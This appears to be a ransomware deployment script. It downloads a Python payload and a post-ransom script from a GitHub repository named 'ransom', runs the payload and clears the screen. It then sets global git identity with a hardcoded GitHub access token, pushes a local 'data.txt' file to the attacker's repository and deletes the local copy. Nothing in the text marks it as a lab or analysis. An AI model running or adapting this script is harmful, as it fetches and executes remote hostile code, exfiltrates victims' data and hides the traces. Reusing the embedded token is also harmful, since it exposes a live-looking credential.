wget https://github.com/samsepi0lw/ransom/blob/main/monsterwith23faces.py?raw=true
wget https://github.com/samsepi0lw/ransom/blob/main/after_ransom_is_given_run_this.sh?raw=true
mv monsterwith23faces.py\?raw=true monsterwith23faces.py
mv after_ransom_is_given_run_this.sh\?raw=true after_ransom_is_given_run_this.sh
clear
#!/bin/bash
python monsterwith23faces.py
echo "hejsa"
git config --global user.name samsepi0lw
git config --global user.email samsepi0lw@proton.me
git config --global github.user samsepi0lw
git config --global github.token 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
git remote set-url origin git@github.com:samsepi0lw/ransom.git
git add ./data.txt
git commit -m "Uploaded data file"
git push origin main
rm ./data.txt
